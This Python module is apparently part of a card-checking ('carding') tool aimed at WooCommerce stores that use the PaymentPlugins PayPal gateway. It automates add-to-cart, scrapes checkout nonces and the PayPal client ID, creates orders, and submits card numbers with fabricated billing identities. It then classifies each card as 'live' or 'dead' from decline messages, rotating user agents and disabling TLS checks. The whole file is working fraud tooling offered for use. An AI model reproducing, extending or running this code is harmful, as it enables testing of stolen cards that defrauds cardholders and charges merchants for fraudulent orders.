"""
pymntpl.py — PaymentPlugins PayPal WooCommerce (pymntpl-paypal-woocommerce) gateway checker.

Detected plugin: pymntpl-paypal-woocommerce (different from official WooCommerce PayPal Payments).

Flow:
  1. Discover product ID
  2. Add to cart
  3. Load /checkout/ → extract:
       - window['wcPPCPSettings'] → clientId, cart/order route
       - wp.apiFetch nonce (X-WP-Nonce)
       - woocommerce-process-checkout-nonce
       - actual checkout URL path (may differ from /checkout/ after redirect)
  4. Get PayPal access token via OAuth2 (clientId only, no secret)
  5. Create PayPal order via wc_ppcp_frontend_request
  6. Confirm payment source via PayPal REST API (with Bearer token + card data)
  7. Submit wc-ajax=checkout with ppcp_card_paypal_order_id

All shared helpers live in utils.py.
"""

import base64
import json
import re
from urllib.parse import urlencode

import requests

from .utils import (
    REQUEST_TIMEOUT,
    convert_year,
    discover_product_id,
    get_billing_identity,
    get_country_for_domain,
    random_ua,
)


# ── Dead-result keywords ──────────────────────────────────────────────────────

_DEAD_KEYWORDS = [
    "declined",
    "do not honor",
    "transaction refused",
    "transaction has been refused",
    "security violation",
    "invalid card",
    "card was declined",
    "insufficient funds",
    "card has expired",
    "expired card",
    "security code",
    "payment could not be processed",
    "fraud",
    "blocked",
    "exceeds limit",
    "call your bank",
    "contact your bank",
    "restricted card",
    "transaction not allowed",
    "card not supported",
    "payment_denied",
    "order_not_approved",
    "transaction_refused",
    "payment provider declined",
    "we were unable to process your order",
    "unable to process your payment",
    # Additional PayPal / WC decline reasons
    "lost or stolen",
    "card reported lost",
    "cvv2 failure",
    "cvv2",
    "restricted or inactive",
    "account closed",
    "invalid account",
    "account suspended",
    "card is not activated",
    "not permitted",
    "do not honour",
    "expired card",
    "card has expired",
    "security code",
    "restricted card",
    "transaction not allowed",
    "card not supported",
]


# ── PayPal issue-code → readable label ───────────────────────────────────────
_PP_ISSUE_LABELS = {
    "card_expired":                          "Card Expired",
    "invalid_cvv":                           "Invalid CVV",
    "cvv_failure":                           "CVV Failure",
    "instrument_declined":                   "Card Declined",
    "card_declined":                         "Card Declined",
    "unauthorized_card":                     "Unauthorized Card",
    "do_not_honor":                          "Do Not Honor",
    "restricted_card":                       "Restricted Card",
    "card_type_not_supported":               "Card Type Not Supported",
    "account_closed":                        "Account Closed",
    "invalid_account":                       "Invalid Account",
    "card_stolen":                           "Card Reported Stolen",
    "card_lost":                             "Card Reported Lost",
    "currency_not_supported_for_card_type":  "Currency Not Supported",
    "payer_cannot_pay":                      "Payer Cannot Pay",
    "payer_action_required":                 "3DS Required",
    "payer_account_restricted":              "Account Restricted",
    "payer_account_locked_or_closed":        "Account Locked / Closed",
    "transaction_refused":                   "Transaction Refused",
    "security_violation":                    "Security Violation",
    "insufficient_funds":                    "Insufficient Funds",
    "avs_failure":                           "AVS Failure",
    "avs":                                   "AVS Failure",
}


def _extract_reason(text: str) -> str:
    """Pull the 'Reason: X' clause from a WooCommerce error message."""
    m = re.search(r'[Rr]eason\s*:\s*([^.<\n]{3,80})', text)
    if m:
        return m.group(1).strip().rstrip(".").strip()
    return ""


def _classify(payment_text: str, amount: str, card_str: str) -> dict:
    if '"result":"success"' in payment_text and "order-received" in payment_text:
        return {"status": "live", "message": "Charged", "amount": amount, "card": card_str}

    if not payment_text.strip():
        return {"status": "unknown", "message": "Empty response", "amount": amount, "card": card_str}

    try:
        _p = json.loads(payment_text)
        if _p.get("reload") is True:
            return {"status": "dead", "message": "Nonce expired / Reload", "amount": amount, "card": card_str}
    except Exception:
        pass

    raw_msg = ""
    try:
        _p = json.loads(payment_text)
        raw_msg = _p.get("messages", "") or _p.get("message", "") or ""
    except Exception:
        raw_msg = payment_text

    msg_clean = re.sub(r"<[^>]+>", " ", str(raw_msg))
    msg_clean = re.sub(r"\s+", " ", msg_clean).strip()

    # Priority 1: extract "Reason: X" clause → cleanest label
    short_msg = _extract_reason(msg_clean) or _extract_reason(payment_text)

    # Priority 2: PayPal #ISSUE_CODE in the raw text
    if not short_msg:
        m = re.search(r"#([A-Z_]{3,})", payment_text)
        if m:
            code = m.group(1).lower()
            short_msg = _PP_ISSUE_LABELS.get(code, m.group(1).replace("_", " ").title())

    # Priority 3: first 100 chars of cleaned message
    if not short_msg:
        short_msg = msg_clean[:100] or "Unknown"

    combined = (msg_clean + " " + payment_text).lower()
    for kw in _DEAD_KEYWORDS:
        if kw in combined:
            return {"status": "dead", "message": short_msg, "amount": amount, "card": card_str}

    return {"status": "unknown", "message": short_msg or "Unknown response", "amount": amount, "card": card_str}


# ── Amount extraction ─────────────────────────────────────────────────────────

_AMOUNT_PATTERNS = [
    r'order[_-]total.*?<(?:span|bdi)[^>]*>.*?<span[^>]*>\s*([^<]+?)\s*</span>\s*([\d.,]+)',
    r'<tr[^>]*class="[^"]*order-total[^"]*".*?<(?:span|bdi)[^>]*>\s*(?:[^<]*<[^>]+>)?\s*([\d.,]+)',
    r'class="woocommerce-Price-amount[^"]*"[^>]*>.*?<span[^>]*>[^<]*</span>\s*([\d.,]+)',
    r'<span class="woocommerce-Price-currencySymbol">([^<]*)</span>\s*([\d.,]+)',
]


def _extract_amount(html: str) -> str:
    for pat in _AMOUNT_PATTERNS:
        m = re.search(pat, html, re.IGNORECASE | re.DOTALL)
        if m:
            num = m.group(m.lastindex)
            sym = m.group(m.lastindex - 1) if m.lastindex > 1 else "$"
            sym = re.sub(r"<[^>]+>", "", sym).strip() or "$"
            if sym in ("&pound;", "&#163;"):
                sym = "\xa3"
            return f"{sym}{num}"
    return ""


# ── Main checker ──────────────────────────────────────────────────────────────

def check_pymntpl(session: requests.Session, domain: str, card_tuple: tuple, **kwargs) -> dict:
    """Check one card against a WooCommerce + pymntpl-paypal-woocommerce store.

    Detection: checkout page contains window['wcPPCPSettings'] and
    loads scripts from plugins/pymntpl-paypal-woocommerce.

    Returns:
        {"status": "live"|"dead"|"unknown", "message": str, "amount": str, "card": str}
    """
    cc, mm, yy, cvv = card_tuple
    yy       = convert_year(yy)
    mm       = mm.zfill(2)
    card_str = f"{cc}|{mm}|{yy}" + (f"|{cvv}" if cvv else "")
    ua       = random_ua()

    # ── 1. Discover product ID ────────────────────────────────────────────────
    product_id = discover_product_id(session, domain)
    if not product_id:
        return {"status": "unknown", "message": "Could not find product on store", "amount": "", "card": card_str}

    # ── 2. Add to cart (up to 3 attempts, validate response) ─────────────────
    atc_ok = False
    for _attempt in range(3):
        try:
            atc_resp = session.post(
                f"https://{domain}/?wc-ajax=add_to_cart",
                data={"product_id": product_id, "quantity": "1"},
                headers={
                    "User-Agent":       ua,
                    "Accept":           "application/json, text/javascript, */*; q=0.01",
                    "Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                },
                timeout=REQUEST_TIMEOUT,
            )
            if atc_resp.status_code == 200 and '"error":true' not in atc_resp.text and "fragments" in atc_resp.text:
                atc_ok = True
                break
        except Exception as exc:
            return {"status": "unknown", "message": f"ATC error: {exc}", "amount": "", "card": card_str}

    if not atc_ok:
        return {"status": "unknown", "message": "Add to cart failed", "amount": "", "card": card_str}

    # ── 3. Load checkout page ─────────────────────────────────────────────────
    try:
        r             = session.get(
            f"https://{domain}/checkout/",
            headers={"User-Agent": ua, "Upgrade-Insecure-Requests": "1"},
            timeout=REQUEST_TIMEOUT,
        )
        checkout_html = r.text
        # Actual URL after redirect (some stores use /speedshop/checkout/ etc.)
        final_url     = str(r.url)
        checkout_path = "/" + final_url.split("/", 3)[-1] if final_url.count("/") >= 3 else "/checkout/"
        # Derive www domain from final URL for same-origin requests
        from urllib.parse import urlparse
        parsed_base = urlparse(final_url)
        base_domain = parsed_base.netloc   # may be www.domain.com
        base_url    = f"{parsed_base.scheme}://{base_domain}"
    except Exception as exc:
        return {"status": "unknown", "message": f"Checkout load: {exc}", "amount": "", "card": card_str}

    # Guard: must be checkout page (not cart redirect)
    if "woocommerce-process-checkout-nonce" not in checkout_html:
        return {"status": "unknown", "message": "Cart empty / checkout redirect", "amount": "", "card": card_str}

    # Guard: must be the pymntpl plugin
    if "wcPPCPSettings" not in checkout_html:
        return {"status": "unknown", "message": "Not a pymntpl-paypal store", "amount": "", "card": card_str}

    # ── 4. Extract config ─────────────────────────────────────────────────────
    try:
        from urllib.parse import unquote as url_unquote
        cfg_m   = re.search(
            r"window\['wcPPCPSettings'\]\s*=\s*JSON\.parse\(\s*decodeURIComponent\(\s*'([^']+)'\s*\)\s*\)",
            checkout_html,
        )
        cfg     = json.loads(url_unquote(cfg_m.group(1)))
        gd      = cfg["generalData"]
        client_id       = gd["clientId"]
        create_order_url = gd["restRoutes"]["cart/order"]["url"]
    except Exception as exc:
        return {"status": "unknown", "message": f"Config parse error: {exc}", "amount": "", "card": card_str}

    wp_nonce_m = re.search(r"createNonceMiddleware\(\s*[\"']([\w]+)[\"']\s*\)", checkout_html)
    wp_nonce   = wp_nonce_m.group(1) if wp_nonce_m else ""

    wc_nonce_m = re.search(
        r'woocommerce-process-checkout-nonce[^>]*value=["\']([^"\']+)["\']',
        checkout_html,
    )
    wc_nonce = wc_nonce_m.group(1) if wc_nonce_m else ""

    amount = _extract_amount(checkout_html)

    # ── 5. Get PayPal access token via OAuth (clientId + empty secret) ─────────
    # The checkout page only exposes clientId — no bearer token is embedded.
    # PayPal accepts clientId-only Basic auth for guest card flows.
    access_token = ""
    try:
        tok_r = requests.post(
            "https://api.paypal.com/v1/oauth2/token",
            data={"grant_type": "client_credentials"},
            headers={
                "Authorization": "Basic " + base64.b64encode(f"{client_id}:".encode()).decode(),
                "Content-Type":  "application/x-www-form-urlencoded",
            },
            timeout=REQUEST_TIMEOUT,
            verify=False,
        )
        access_token = tok_r.json().get("access_token", "")
    except Exception:
        pass

    # ── 6. Create PayPal order via pymntpl REST route ─────────────────────────
    # create_order_url may be absolute (https://...) or relative (/wp-json/...)
    _order_endpoint = create_order_url if create_order_url.startswith("http") else base_url + create_order_url
    order_id = ""
    try:
        ord_r = session.post(
            _order_endpoint,
            json={"payment_method": "ppcp_card", "context": "checkout"},
            headers={
                "Content-Type": "application/json",
                "X-WP-Nonce":   wp_nonce,
                "Origin":       base_url,
                "Referer":      base_url + checkout_path,
                "User-Agent":   ua,
            },
            timeout=REQUEST_TIMEOUT,
        )
        order_id = ord_r.json()
        if not isinstance(order_id, str) or not order_id:
            return {"status": "unknown", "message": "Order creation failed", "amount": amount, "card": card_str}
    except Exception as exc:
        return {"status": "unknown", "message": f"Create order error: {exc}", "amount": amount, "card": card_str}

    # ── 7. Confirm payment source via PayPal REST API ─────────────────────────
    expiry  = f"{yy}-{mm}"
    ident   = get_billing_identity(domain)
    country = ident.get("country") or get_country_for_domain(domain)

    pp_headers = {
        "Accept":       "application/json",
        "Content-Type": "application/json",
        "User-Agent":   ua,
    }
    if access_token:
        pp_headers["Authorization"] = f"Bearer {access_token}"

    # PayPal error issue codes that map to DEAD (card-level rejections)
    _PP_DEAD_ISSUES = {
        "card_expired", "invalid_cvv", "cvv_failure", "instrument_declined",
        "card_declined", "unauthorized_card", "do_not_honor", "restricted_card",
        "card_type_not_supported", "account_closed", "invalid_account",
        "card_stolen", "card_lost", "currency_not_supported_for_card_type",
        "payer_cannot_pay", "payer_action_required", "payer_account_restricted",
        "payer_account_locked_or_closed", "transaction_refused",
    }

    try:
        confirm_r = requests.post(
            f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
            json={
                "payment_source": {
                    "card": {
                        "number":        cc,
                        "expiry":        expiry,
                        "security_code": cvv,
                        "name":          f"{ident['fname']} {ident['lname']}",
                        "billing_address": {
                            "address_line_1": ident["street"],
                            "admin_area_2":   ident["city"],
                            "admin_area_1":   ident.get("state", ""),
                            "postal_code":    ident["zip"],
                            "country_code":   country,
                        },
                    }
                }
            },
            headers=pp_headers,
            timeout=REQUEST_TIMEOUT,
            verify=False,
        )

        if confirm_r.status_code >= 400:
            # PayPal rejected the card — classify here, skip checkout submission
            # (submitting checkout with an unconfirmed order causes WordPress PHP fatal)
            try:
                err      = confirm_r.json()
                details  = err.get("details", [])
                issue    = (details[0].get("issue", "") if details else "").lower()
                name     = err.get("name", "").lower()
            except Exception:
                issue, name = "", confirm_r.text[:80].lower()

            combined_err = f"{issue} {name}".strip()
            label = _PP_ISSUE_LABELS.get(issue, (issue or name or "declined").replace("_", " ").title())[:80]
            is_dead = any(k in combined_err for k in _PP_DEAD_ISSUES)
            return {
                "status":  "dead" if is_dead else "unknown",
                "message": label,
                "amount":  amount,
                "card":    card_str,
            }

    except Exception:
        pass   # network error — proceed to checkout and let it decide

    # ── 8. Submit checkout ────────────────────────────────────────────────────
    form_data = urlencode({
        "billing_first_name":   ident["fname"],
        "billing_last_name":    ident["lname"],
        "billing_company":      "",
        "billing_country":      country,
        "billing_address_1":    ident["street"],
        "billing_address_2":    "",
        "billing_city":         ident["city"],
        "billing_state":        ident.get("state", ""),
        "billing_postcode":     ident["zip"],
        "billing_phone":        ident["phone"],
        "billing_email":        ident["email"],
        "payment_method":                        "ppcp_card",
        "ppcp_card_paypal_order_id":             order_id,
        "woocommerce-process-checkout-nonce":    wc_nonce,
        "terms":                "on",
        "terms-field":          "1",
        "_wp_http_referer":     checkout_path,
    })

    try:
        pay_r = session.post(
            base_url + "/?wc-ajax=checkout",
            data=form_data,
            headers={
                "Content-Type":      "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With":  "XMLHttpRequest",
                "Origin":            base_url,
                "Referer":           base_url + checkout_path,
                "User-Agent":        ua,
            },
            timeout=REQUEST_TIMEOUT,
        )
        payment_text = pay_r.text
    except Exception as exc:
        return {"status": "unknown", "message": f"Checkout submit: {exc}", "amount": amount, "card": card_str}

    return _classify(payment_text, amount, card_str)
